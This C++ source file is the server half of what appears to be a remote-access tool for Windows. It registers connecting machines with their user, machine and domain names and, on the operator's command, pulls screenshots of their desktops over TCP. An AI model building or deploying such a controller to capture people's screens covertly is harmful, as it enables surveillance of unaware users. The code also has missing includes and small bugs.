#include <iostream>
#include <winsock2.h>
#include <fstream>
#include <filesystem>
#include <functional>
#include <map>

/*****************************************************************************/
/*                              Global Things                                */
/*****************************************************************************/

typedef struct ClientInfo_ {
    std::string ip;
    int port;
    std::string user;
    std::string machine;
    std::string domain;
    std::string time;
    bool active;
    SOCKET socket;
} ClientInfo, *PClientInfo;

std::map<std::pair<std::string, int>, ClientInfo> Clients;

/*****************************************************************************/
/*                              Global Things End                            */
/*****************************************************************************/



/*****************************************************************************/
/*                              Сommand Basis Features                       */
/*****************************************************************************/

// BasicClass of command
class Command {
public:
    virtual ~Command() {}
    virtual void execute(const std::string& arg1, const std::string& arg2) = 0;
};

// Specific command
class ConcreteCommand : public Command {
private:
    std::function<void(const std::string&, const std::string&)> action;
public:
    ConcreteCommand(const std::function<void(const std::string&, const std::string&)>& action) : action(action) {}
    void execute(const std::string& arg1, const std::string& arg2) override { action(arg1, arg2); }
};

// Command interpretator
class CommandInvoker {
private:
    std::map<std::string, Command*> commands;
public:
    void registerCommand(const std::string& name, Command* command) {
        commands[name] = command;
    }

    void executeCommand(const std::string& name, const std::string& arg1, const std::string& arg2) {
        if (commands.find(name) != commands.end()) {
            commands[name]->execute(arg1, arg2);
        }
        else {
            std::cout << "Command not found: " << name << std::endl;
        }
    }
};

/*****************************************************************************/
/*                              Сommand Basis Features End                   */
/*****************************************************************************/

/*****************************************************************************/
/*                              Main Server Class                            */
/*****************************************************************************/
#define DEFAULT_BUFLEN 512

class Server {
public:
    Server() {
        std::cout << "You can write: help || -h || --h for commands help\n\n\n";

        std::cout << "Default host(for example: 192.168.0.200): ";
        std::cin >> DEFAULT_HOST;

        std::cout << "\nDefault port(for example: 12345): ";
        std::cin >> DEFAULT_PORT;

        // Инициализация Winsock
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            std::cout << "WSAStartup failed.\n";
            exit(1);
        }

        server_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (server_socket == INVALID_SOCKET) {
            std::cout << "Error creating socket.\n";
            WSACleanup();
            exit(1);
        }

        sockaddr_in server_addr;
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(atoi(DEFAULT_PORT.c_str()));
        server_addr.sin_addr.S_un.S_addr = inet_addr(DEFAULT_HOST.c_str());

        if (bind(server_socket, (SOCKADDR*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
            std::cout << "Bind failed.\n";
            closesocket(server_socket);
            WSACleanup();
            exit(1);
        }

        if (listen(server_socket, SOMAXCONN) == SOCKET_ERROR) {
            std::cout << "Listen failed.\n";
            closesocket(server_socket);
            WSACleanup();
            exit(1);
        }

        std::cout << "Server listening on " << DEFAULT_HOST << ":" << DEFAULT_PORT << "\n";

        std::thread AcptThread(&Server::accept_clients, this);
        std::thread SndThread(&Server::get_data, this);
    
        AcptThread.join();
        SndThread.join();
    }

    ~Server() {
        closesocket(server_socket);
        WSACleanup();
    }

private:
    std::string DEFAULT_HOST;
    std::string DEFAULT_PORT;
    SOCKET server_socket;

    void ListClients() {
        std::cout << "List of all connected clients:\n";
        for (auto& [addr, ClInfo] : Clients) 
        {
            std::cout << "#################################################################\n";
        
            std::time_t Now = std::time(nullptr);
            std::tm LT = {};
            ::localtime_s(&LT, &Now);
            std::ostringstream oss;
            oss << std::put_time(&LT, "%Y-%m-%d %H:%M:%S");
            ClInfo.time = oss.str();
            std::cout << "IP: " << ClInfo.ip << "\nPort: " << ClInfo.port << "\n"
                << "Machine: " << ClInfo.machine << "\nUser: " << ClInfo.user << "\n"
                << "Domain: " << ClInfo.domain << "\nLast activity: " << ClInfo.time << "\n";
        
            std::cout << "#################################################################\n";
        }
    }

    void ReceiveAndSaveBmp(SOCKET ClSocket, const std::string& FileName) {
        char Buffer[DEFAULT_BUFLEN];
        int RecvBufLen = DEFAULT_BUFLEN;

        int BytesRecv = recv(ClSocket, Buffer, RecvBufLen, 0);
        if (BytesRecv == SOCKET_ERROR) { std::cout << "Error: Failed to receive BMP file header.\n"; return; }

        std::ofstream File(FileName, std::ios::binary);
        if (!File) { std::cout << "Error opening file for writing.\n"; return; }

        File.write(Buffer, BytesRecv);
        int FileSize = *reinterpret_cast<int*>(Buffer + 2);
        int RemainingData = FileSize - BytesRecv;

        while (RemainingData > 0) {
            BytesRecv = recv(ClSocket, Buffer, std::min(DEFAULT_BUFLEN, RemainingData), 0);
            if (BytesRecv == SOCKET_ERROR) { std::cout << "Error receiving data.\n"; break; }
            File.write(Buffer, BytesRecv);
            RemainingData -= BytesRecv;
        }

        File.close();
        std::cout << "File '" << FileName << "' successfully received and saved.\n";
    }

    void ControlTimeClient(SOCKET ClSocket, const std::pair<std::string, int>& addr) {
        while (true) { char Buffer[DEFAULT_BUFLEN] = {}; send(ClSocket, Buffer, 0, 0); std::this_thread::sleep_for(std::chrono::seconds(1)); }
    }

    std::tuple<std::string, std::string, std::string> get_user_info(SOCKET client_socket) {
        char Buffer[DEFAULT_BUFLEN];
        int BytesRecv = recv(client_socket, Buffer, DEFAULT_BUFLEN, 0);
        if (BytesRecv == SOCKET_ERROR) { std::cout << "Error receiving user info.\n"; return { "Unknown", "Unknown", "Unknown" }; }

        std::string info(Buffer, BytesRecv);
        std::istringstream iss(info);
        std::string username, machine, domain;
        iss >> username >> machine >> domain;
        return { username, machine, domain };
    }

    void accept_clients() {
        while (true) {
            sockaddr_in ClAddr;
            int AddrLen = sizeof(ClAddr);
            SOCKET ClSocket = accept(server_socket, (sockaddr*)&ClAddr, &AddrLen);

            if (ClSocket == INVALID_SOCKET) {
                std::cout << "Error occurred while accepting a client.\n";
                continue;
            }

            std::string ip(inet_ntoa(ClAddr.sin_addr));
            int port = ntohs(ClAddr.sin_port);
            auto [username, machine, domain] = get_user_info(ClSocket);

            ClientInfo client_info{
                .ip = ip,
                .port = port,
                .user = username,
                .machine = machine,
                .domain = domain,
                .time = "Unknown",
                .active = true,
                .socket = ClSocket
            };

            Clients[{ip, port}] = client_info;
            std::thread client_thread(std::bind(&Server::ControlTimeClient, this, ClSocket, std::make_pair(ip, port)));
            client_thread.detach();
        }
    }

    void get_data() {
        CommandInvoker Invoker;
        
        // Registration of commands
        Invoker.registerCommand("LS", new ConcreteCommand([this](const std::string&, const std::string&) {
            ListClients();
            }));
        
        Invoker.registerCommand("screenshot", new ConcreteCommand([this](const std::string& ip, const std::string& szPort) {
            if (ip.size() != 0 && szPort.size() != 0)
            {
                std::cout << "Receiving and saving a BMP file from " << ip << " by port: " << szPort << std::endl;
                int Port = std::stoi(szPort);
                auto it = Clients.find({ ip, Port });
                if (it != Clients.end() && it->second.active) {
                    send(it->second.socket, "screenshot", sizeof("screenshot"), 0);
                    ReceiveAndSaveBmp(it->second.socket, ip + ".bmp");
                }
                else {
                    std::cout << "Client " << ip << ":" << szPort << " is inactive.\n";
                }
            }
            else
            {
                std::cout << "Invalid screenshot format command: ";
                std::cout << "screenshot 192.168.1.228 53454\n";
            }
            }));
        
        while (true) 
        {
            std::string command;
            std::cin >> command;
        
            if (command == "LS") {
                Invoker.executeCommand("LS", "", "");
                continue;
            }
        
            if (command == "screenshot") {
                std::string arg1;
                std::cin >> arg1;
                std::string arg2;
                std::cin >> arg2;
                Invoker.executeCommand("screenshot", arg1, arg2);
            }
        
            if (command == "help" || command == "-h" || command == "--h")
            {
                std::cout << "Command " << "LS " << "About: " << "Listing all connected clients" << std::endl;
                std::cout << "Command " << "screenshot " << "executes in 3 lines example(cause i'm very lazy and i don't love coding of such \"Tests\" without any pay): " << "\n###########\nscreenshot\n192.168.0.200\n53453\n###########\n" << "About: " 
                    << "U can make screenshot of desktop through this" << std::endl;
            }
        }
    }
};

/*****************************************************************************/
/*                              Main Server Class END                        */
/*****************************************************************************/

int main() {
    Server server;
    return 0;
}